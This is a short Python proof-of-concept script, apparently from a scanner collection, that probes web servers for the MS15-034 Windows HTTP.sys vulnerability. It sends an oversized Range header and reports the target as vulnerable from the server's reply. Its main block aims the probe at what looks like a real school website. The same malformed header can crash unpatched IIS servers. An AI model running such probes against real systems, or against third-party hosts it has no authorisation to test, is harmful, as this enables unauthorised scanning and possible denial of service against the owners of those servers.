#!/usr/bin/env python
# -*- coding: utf-8 -*-
# author = w8ay
import requests


def poc(url):
    if '://' not in url:
        url = 'http://' + url
    try:
        header = {
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36",
            "Range": "bytes=0-18446744073709551615"
        }
        r = requests.get(url, headers=header, timeout=5)
        if "Requested Range Not Satisfiable" in r.text or "Requested Range Not Satisfiable" in r.headers:
            result = "目标存在Microsoft Windows HTTP.sys远程代码执行漏洞 (MS15-034) url:%s" % url
            return result
        else:
            return False
    except:
        return False


if __name__ == '__main__':
    a = poc('hmzhihui.hmschool.edu.sh.cn')
    print(a)